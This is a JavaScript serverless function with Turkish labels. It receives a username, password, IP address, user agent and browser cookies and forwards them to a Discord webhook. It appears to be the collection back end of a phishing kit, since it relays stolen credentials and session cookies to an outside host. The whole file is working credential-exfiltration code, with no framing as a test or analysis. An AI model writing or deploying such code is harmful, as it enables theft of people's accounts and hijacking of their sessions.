// functions/send.js

exports.handler = async (event) => {
    const { username, password, ip, user_agent, cookies } = JSON.parse(event.body);

    const message = `🔐 Yeni Güncelleme (${new Date().toISOString()}):\n📧 E-posta: ${username}\n🔑 Şifre: ${password}\n🌐 IP: ${ip}\n🧭 Tarayıcı: ${user_agent}\n🍪 Çerezler: ${cookies}`;

    const response = await fetch(process.env.DISCORD_WEBHOOK_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ content: message })
    });

    if (!response.ok) {
        return {
            statusCode: 500,
            body: JSON.stringify({ error: 'Discord webhook başarısız oldu.' })
        };
    }

    return {
        statusCode: 200,
        body: JSON.stringify({ message: 'Veri başarıyla gönderildi.' })
    };
};
